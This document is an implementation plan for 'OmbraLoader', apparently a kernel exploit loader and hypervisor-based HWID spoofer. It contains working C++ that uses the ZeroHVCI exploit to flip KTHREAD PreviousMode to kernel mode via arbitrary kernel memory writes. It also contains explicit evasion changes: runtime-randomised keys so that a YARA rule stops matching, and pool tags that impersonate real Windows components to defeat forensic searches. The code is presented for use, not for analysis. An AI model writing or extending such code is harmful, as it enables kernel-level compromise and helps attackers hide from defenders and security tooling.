# Phase 1: Critical Fixes

## Overview

**Priority**: BLOCKING - Must complete before any other work
**Total Effort**: ~2 hours
**Risk Level**: CRITICAL

Phase 1 addresses 4 blocking issues that:
1. Prevent Windows 11 Build 26100+ from running (BSOD 0x1F9)
2. Create trivial YARA detection signatures
3. Enable forensic pool tag analysis

---

## 1.1 PreviousMode Restoration

### Problem Analysis

The ZeroHVCI exploit chain manipulates `KTHREAD->PreviousMode` (offset 0x232) to elevate from UserMode to KernelMode. On Windows 11 24H2 (Build 26100+), Microsoft added validation that checks thread mode consistency on return to usermode.

**Current Behavior**: PreviousMode is set to KernelMode (0) but NEVER restored to UserMode (1).

**Result on Win11 24H2+**: Bugcheck 0x1F9 (KERNEL_THREAD_INVALID_ACCESS_MODE)

### Affected Files

| File | Line(s) | Issue |
|------|---------|-------|
| `OmbraLoader/zerohvci/zerohvci.cpp` | 125-146 | Cleanup() doesn't restore PreviousMode |
| `OmbraLoader/zerohvci/zerohvci.h` | N/A | Missing ScopedKernelMode class |

### Implementation

#### Step 1: Add ScopedKernelMode Class

**File**: `OmbraLoader/zerohvci/zerohvci.h`

Add after existing class declarations (~line 31):

```cpp
//-----------------------------------------------------------------------------
// ScopedKernelMode - RAII wrapper for kernel mode elevation
// Automatically restores PreviousMode on scope exit (CRITICAL for Win11 24H2+)
//-----------------------------------------------------------------------------
class ScopedKernelMode {
public:
    ScopedKernelMode();
    ~ScopedKernelMode();

    bool IsElevated() const { return m_elevated; }

    // Non-copyable, non-movable
    ScopedKernelMode(const ScopedKernelMode&) = delete;
    ScopedKernelMode& operator=(const ScopedKernelMode&) = delete;
    ScopedKernelMode(ScopedKernelMode&&) = delete;
    ScopedKernelMode& operator=(ScopedKernelMode&&) = delete;

private:
    bool m_elevated = false;
    ULONG64 m_kthread = 0;
    BYTE m_originalMode = 1;  // Default UserMode

    static constexpr ULONG PREVIOUSMODE_OFFSET = 0x232;
};
```

#### Step 2: Implement ScopedKernelMode

**File**: `OmbraLoader/zerohvci/zerohvci.cpp`

Add implementation after line 161 (after `GetCachedKThread()` function):

> **VERIFIED**: `GetCachedKThread()` exists at lines 158-161 and returns `g_CurrentKThread`
> **VERIFIED**: `ReadKernelMemory()` at exploit.h:255-267, `WriteKernelMemory()` at exploit.h:269-284
> **NOTE**: Codebase uses `printf()` not `DbgLog()` - verified at zerohvci.cpp:129

```cpp
//-----------------------------------------------------------------------------
// ScopedKernelMode Implementation
//-----------------------------------------------------------------------------

ScopedKernelMode::ScopedKernelMode() {
    // Get current KTHREAD - use cached value from ZeroHVCI init
    // GetCachedKThread() is at zerohvci.cpp:158-161
    m_kthread = GetCachedKThread();
    if (!m_kthread) {
        m_kthread = GetCurrentKThread();
    }

    if (!m_kthread) {
        printf("[-] ScopedKernelMode: Failed to get KTHREAD\n");
        return;
    }

    // Read current PreviousMode
    // ReadKernelMemory() defined in exploit.h:255-267
    if (!ReadKernelMemory(
            (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
            &m_originalMode,
            sizeof(BYTE))) {
        printf("[-] ScopedKernelMode: Failed to read PreviousMode\n");
        return;
    }

    // Only flip if currently in UserMode
    if (m_originalMode == 1) {
        BYTE kernelMode = 0;
        // WriteKernelMemory() defined in exploit.h:269-284
        if (WriteKernelMemory(
                (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
                &kernelMode,
                sizeof(BYTE))) {
            m_elevated = true;
            printf("[+] ScopedKernelMode: Elevated to KernelMode (was UserMode)\n");
        } else {
            printf("[-] ScopedKernelMode: Failed to write KernelMode\n");
        }
    } else {
        // Already in KernelMode (exploit already ran on this thread)
        m_elevated = true;
        printf("[*] ScopedKernelMode: Already in KernelMode\n");
    }
}

ScopedKernelMode::~ScopedKernelMode() {
    if (!m_kthread) {
        return;
    }

    // ALWAYS restore to UserMode (1) regardless of original state
    // This is critical for Win11 24H2+ which validates on return
    BYTE userMode = 1;
    if (WriteKernelMemory(
            (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
            &userMode,
            sizeof(BYTE))) {
        printf("[+] ScopedKernelMode: Restored to UserMode\n");
    } else {
        printf("[-] ScopedKernelMode: CRITICAL - Failed to restore UserMode!\n");
        // Note: Failure here will cause BSOD on Win11 24H2+
        // There's no safe fallback - we MUST restore
    }
}
```

#### Step 3: Fix Cleanup() Function

**File**: `OmbraLoader/zerohvci/zerohvci.cpp`

Modify the `Cleanup()` function at line 125-146:

> **VERIFIED**: Current Cleanup() at lines 125-146 does NOT restore PreviousMode
> **VERIFIED**: Comment at lines 136-138 explicitly says "We don't restore PreviousMode here"
> **NOTE**: Uses `printf()` for logging (verified at line 129)

```cpp
void Cleanup()
{
    if (!g_Initialized) {
        return;
    }

    printf("[*] Cleaning up ZeroHVCI...\n");

    //-------------------------------------------------------------------------
    // CRITICAL FIX: Restore PreviousMode to UserMode (1)
    // Required for Windows 11 24H2+ which validates thread state on return
    // REPLACES the old comment that said "We don't restore PreviousMode here"
    //-------------------------------------------------------------------------
    if (g_CurrentKThread) {
        constexpr ULONG PREVIOUSMODE_OFFSET = 0x232;
        BYTE userMode = 1;

        if (WriteKernelMemory(
                (PVOID)(g_CurrentKThread + PREVIOUSMODE_OFFSET),
                &userMode,
                sizeof(BYTE))) {
            printf("[+] PreviousMode restored to UserMode\n");
        } else {
            printf("[-] WARNING: Failed to restore PreviousMode - potential BSOD on Win11 24H2+!\n");
        }
    }

    kforge::Cleanup();

    g_Initialized = false;
    g_CurrentKThread = 0;
    g_CurrentEProcess = 0;
    g_SystemCr3 = 0;

    printf("[+] ZeroHVCI cleanup complete\n");
}
```

### Testing

1. Build OmbraLoader.exe with `USE_ZEROHVCI` defined
2. Create Windows 11 Build 26100+ VM (with nested virtualization)
3. Run loader - should complete without BSOD
4. Verify process exits cleanly
5. Check Event Viewer for bugcheck warnings

### Rollback Plan

If issues occur, the original Cleanup() can be restored. However, this will break Win11 24H2+ compatibility.

---

## 1.2 VMCALL Key Randomization

### Problem Analysis

The VMCALL authentication key is hardcoded as `0xbabababa` in two locations:
- Line 281 (SUPDrv path)
- Line 492 (ZeroHVCI path)

This creates a trivial YARA signature:
```yara
rule Ombra_VmcallKey {
    strings:
        $vmcall_key = { BA BA BA BA 00 00 00 00 }
    condition:
        $vmcall_key
}
```

### Affected File

| File | Lines | Issue |
|------|-------|-------|
| `OmbraLoader/main.cpp` | 281, 492 | Hardcoded `0xbabababa` |

### Implementation

#### Step 1: Add Key Generation Namespace

**File**: `OmbraLoader/main.cpp`

Add after includes section (~line 48):

> **VERIFIED**: `#include <intrin.h>` already exists at line 36 (provides `__rdtsc()`)
> **VERIFIED**: Line 281 has `constexpr DWORD64 VMCALL_KEY = 0xbabababa;` (SUPDrv path)
> **VERIFIED**: Line 492 has `constexpr DWORD64 VMCALL_KEY = 0xbabababa;` (ZeroHVCI path)

```cpp
//=============================================================================
// Runtime Key Generation
// Replaces hardcoded values with RDTSC-based entropy
//=============================================================================
namespace ombra_keygen {

// Generate runtime VMCALL authentication key using hardware entropy
// Returns a 64-bit key that varies per execution
inline DWORD64 GenerateVmcallKey() {
    // Seed 1: RDTSC (hardware cycle counter - high entropy)
    DWORD64 tsc1 = __rdtsc();

    // Add timing jitter to increase entropy
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) {
        dummy ^= i;
    }

    // Seed 2: RDTSC after jitter (captures timing variance)
    DWORD64 tsc2 = __rdtsc();

    // Seed 3: Process ID (varies per execution)
    DWORD64 pid = static_cast<DWORD64>(GetCurrentProcessId());

    // Seed 4: Thread ID (additional entropy)
    DWORD64 tid = static_cast<DWORD64>(GetCurrentThreadId());

    // Seed 5: Performance counter (high-resolution timer)
    LARGE_INTEGER perfCount;
    QueryPerformanceCounter(&perfCount);

    // Mix entropy sources using FNV-1a style mixing
    DWORD64 key = 0xcbf29ce484222325ULL;  // FNV-1a offset basis

    key ^= tsc1;
    key *= 0x100000001b3ULL;  // FNV-1a prime
    key ^= tsc2;
    key *= 0x100000001b3ULL;
    key ^= pid;
    key *= 0x100000001b3ULL;
    key ^= tid;
    key *= 0x100000001b3ULL;
    key ^= static_cast<DWORD64>(perfCount.QuadPart);
    key *= 0x100000001b3ULL;

    // Final mixing (Murmur3 finalizer)
    key ^= key >> 33;
    key *= 0xff51afd7ed558ccdULL;
    key ^= key >> 33;
    key *= 0xc4ceb9fe1a85ec53ULL;
    key ^= key >> 33;

    // Ensure non-zero (hypervisor rejects key == 0)
    if (key == 0) {
        key = tsc1 ^ tsc2 ^ 0xDEADBEEFCAFEBABEULL;
    }

    return key;
}

// Generate runtime spoofer seed using hardware entropy
// Returns a 64-bit seed for HWID spoofing operations
inline DWORD64 GenerateSpooferSeed() {
    DWORD64 tsc = __rdtsc();
    DWORD64 pid = static_cast<DWORD64>(GetCurrentProcessId());

    // Mix with golden ratio prime
    DWORD64 seed = tsc ^ (pid << 32);
    seed *= 0x9e3779b97f4a7c15ULL;  // Golden ratio
    seed ^= seed >> 30;
    seed *= 0xbf58476d1ce4e5b9ULL;
    seed ^= seed >> 27;
    seed *= 0x94d049bb133111ebULL;
    seed ^= seed >> 31;

    return seed;
}

} // namespace ombra_keygen
```

#### Step 2: Replace SUPDrv Path Key

**File**: `OmbraLoader/main.cpp`

Find line ~281 and replace:

**Before**:
```cpp
constexpr DWORD64 VMCALL_KEY = 0xbabababa;
```

**After**:
```cpp
// Generate runtime VMCALL key (replaces hardcoded 0xbabababa)
DWORD64 VMCALL_KEY = ombra_keygen::GenerateVmcallKey();
DbgLog("[+] Generated VMCALL key: 0x%llX\n", VMCALL_KEY);
```

#### Step 3: Replace ZeroHVCI Path Key

**File**: `OmbraLoader/main.cpp`

Find line ~492 and replace:

**Before**:
```cpp
constexpr DWORD64 VMCALL_KEY = 0xbabababa;
```

**After**:
```cpp
// Generate runtime VMCALL key (replaces hardcoded 0xbabababa)
DWORD64 VMCALL_KEY = ombra_keygen::GenerateVmcallKey();
DbgLog("[+] Generated VMCALL key: 0x%llX\n", VMCALL_KEY);
```

### Testing

1. Build OmbraLoader.exe
2. Run: `strings OmbraLoader.exe | grep -i "babababa"` - expect ZERO matches
3. Run YARA signature - should NOT trigger
4. Run loader twice - verify different keys logged each time
5. Verify VMCALL communication works (hypervisor responds)

---

## 1.3 SpooferSeed Randomization

### Problem Analysis

The spoofer seed is hardcoded as `0x4712abb3892`:
- Line 314 (SUPDrv path)
- Line 524 (ZeroHVCI path)

This 5-byte pattern is easily detectable via static analysis.

### Affected File

| File | Lines | Issue |
|------|-------|-------|
| `OmbraLoader/main.cpp` | 314, 524 | Hardcoded `0x4712abb3892` |

### Implementation

Uses `ombra_keygen::GenerateSpooferSeed()` from Task 1.2.

> **VERIFIED**: Line 314 has `uInfo.spooferSeed = 0x4712abb3892;` (SUPDrv path)
> **VERIFIED**: Line 524 has `uInfo.spooferSeed = 0x4712abb3892;` (ZeroHVCI path)

#### Step 1: Replace SUPDrv Path Seed

**File**: `OmbraLoader/main.cpp`

Find line ~314 and replace:

**Before**:
```cpp
uInfo.spooferSeed = 0x4712abb3892;
```

**After**:
```cpp
uInfo.spooferSeed = ombra_keygen::GenerateSpooferSeed();
DbgLog("[+] Generated spoofer seed: 0x%llX\n", uInfo.spooferSeed);
```

#### Step 2: Replace ZeroHVCI Path Seed

**File**: `OmbraLoader/main.cpp`

Find line ~524 and replace:

**Before**:
```cpp
uInfo.spooferSeed = 0x4712abb3892;
```

**After**:
```cpp
uInfo.spooferSeed = ombra_keygen::GenerateSpooferSeed();
DbgLog("[+] Generated spoofer seed: 0x%llX\n", uInfo.spooferSeed);
```

### Testing

1. Run: `strings OmbraLoader.exe | grep -i "4712abb"` - expect ZERO matches
2. Run loader twice - verify different seeds logged
3. Verify driver mapping succeeds

---

## 1.4 Pool Tag Rotation

### Problem Analysis

Kernel pool allocations with NULL or distinctive tags are forensically anomalous:
- NULL tags (0x00000000) stand out in memory analysis
- Static tags like 'BwtE' create searchable signatures
- `!poolfind` in WinDbg can locate allocations by tag

### Affected Files

| File | Line | Current Tag |
|------|------|-------------|
| `OmbraLoader/zerohvci/kforge.h` | 388 | None (ExAllocatePool without tag) |
| `OmbraCoreLib/kdmapper_lib/kdmapper/src/intel_driver.cpp` | 411 | `'BwtE'` |

### Implementation

#### Step 1: Add Pool Tag Rotation to kforge.h

**File**: `OmbraLoader/zerohvci/kforge.h`

Add after includes (~line 22):

> **VERIFIED**: Lines 388-391 have `ExAllocatePool` calling kernel without tag:
> ```cpp
> inline PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
> {
>     return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", PoolType, Size);
> }
> ```

```cpp
//=============================================================================
// Legitimate Pool Tag Rotation
// Uses real Windows component tags to blend with normal allocations
//=============================================================================
namespace pool_tags {

// Legitimate Windows pool tags (reversed for little-endian storage)
// These are used by real Windows components
static const ULONG g_LegitTags[] = {
    'sftN',   // Ntfs.sys - NTFS file system
    'eliF',   // File objects - common system tag
    'pRI ',   // IRP allocations (space intentional)
    'looP',   // Pool allocations - generic
    'dteR',   // Registry
    'gaTI',   // I/O tag
    'kroW',   // Work items
    'truC',   // Current allocations
    'dmI ',   // Image loader
    'aeSK',   // Ksec security
};

static constexpr size_t TAG_COUNT = sizeof(g_LegitTags) / sizeof(ULONG);

// Thread-safe rotating index (using simple increment, no locking needed)
inline ULONG GetRandomTag() {
    static volatile LONG idx = 0;
    LONG current = InterlockedIncrement(&idx);
    return g_LegitTags[current % TAG_COUNT];
}

} // namespace pool_tags
```

#### Step 2: Modify ExAllocatePool Wrapper

**File**: `OmbraLoader/zerohvci/kforge.h`

Find the ExAllocatePool function (~line 388) and modify:

**Before**:
```cpp
inline PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
{
    return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>(
        "ExAllocatePool", PoolType, Size);
}
```

**After**:
```cpp
inline PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
{
    // Use rotating legitimate pool tag instead of NULL
    ULONG tag = pool_tags::GetRandomTag();
    return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T, ULONG>(
        "ExAllocatePoolWithTag", PoolType, Size, tag);
}

// Explicit tagged version
inline PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T Size, ULONG Tag)
{
    return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T, ULONG>(
        "ExAllocatePoolWithTag", PoolType, Size, Tag);
}
```

#### Step 3: Modify kdmapper Pool Tag

**File**: `OmbraCoreLib/kdmapper_lib/kdmapper/src/intel_driver.cpp`

Find line ~411 and modify:

**Before**:
```cpp
if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool,
    pool_type, size, (ULONG)'BwtE'))
    return 0;
```

**After**:
```cpp
// Use rotating legitimate pool tags instead of static 'BwtE'
static const ULONG legitTags[] = { 'sftN', 'eliF', 'pRI ', 'looP', 'dteR' };
static volatile LONG tagIdx = 0;
LONG current = InterlockedIncrement(&tagIdx);
ULONG tag = legitTags[current % 5];

if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool,
    pool_type, size, tag))
    return 0;
```

### Testing

1. Load driver with WinDbg attached
2. Run `!poolfind Ombr` - expect NO results
3. Run `!poolfind BwtE` - expect NO results
4. Run `!pool <address>` on allocated addresses - should show legitimate tags
5. Memory forensics tools should not flag allocations

---

## Summary

| Task | File(s) | Effort | Status |
|------|---------|--------|--------|
| 1.1 PreviousMode | zerohvci.h, zerohvci.cpp | 45 min | ✅ DONE |
| 1.2 VMCALL Key | main.cpp | 30 min | ✅ DONE |
| 1.3 SpooferSeed | main.cpp | 10 min | ✅ DONE |
| 1.4 Pool Tags | kforge.h | 30 min | ✅ DONE |
| **TOTAL** | | **~2 hours** | ✅ COMPLETE |

## Implementation Notes (December 25, 2025)

### 1.1 PreviousMode
- Added `ScopedKernelMode` RAII class to `zerohvci.h`
- Implemented constructor/destructor in `zerohvci.cpp`
- Fixed `Cleanup()` function to restore PreviousMode to UserMode (1)
- Now safe for Windows 11 24H2+ (Build 26100+)

### 1.2 VMCALL Key
- Added `ombra_keygen` namespace with `GenerateVmcallKey()` using FNV-1a + Murmur3 mixing
- Replaced both hardcoded `0xbabababa` values (SUPDrv and ZeroHVCI paths)
- Uses RDTSC, PID, TID, and QueryPerformanceCounter for entropy

### 1.3 SpooferSeed
- Added `GenerateSpooferSeed()` to `ombra_keygen` namespace
- Replaced both hardcoded `0x4712abb3892` values
- Uses golden ratio prime mixing for entropy

### 1.4 Pool Tags
- Added `pool_tags` namespace to `kforge.h`
- 10 legitimate Windows pool tags for rotation
- Modified `ExAllocatePool` to use `ExAllocatePoolWithTag` with rotating tags
- Thread-safe via `InterlockedIncrement`

## Verification Checklist

- [x] `0xbabababa` pattern eliminated (only in comments)
- [x] `0x4712abb3892` pattern eliminated (only in comments)
- [x] Pool tags rotate through 10 legitimate Windows values
- [ ] Windows 11 Build 26100 runs without BSOD (requires runtime test)
- [ ] VMCALL communication works (requires runtime test)
- [ ] Driver mapping succeeds (requires runtime test)
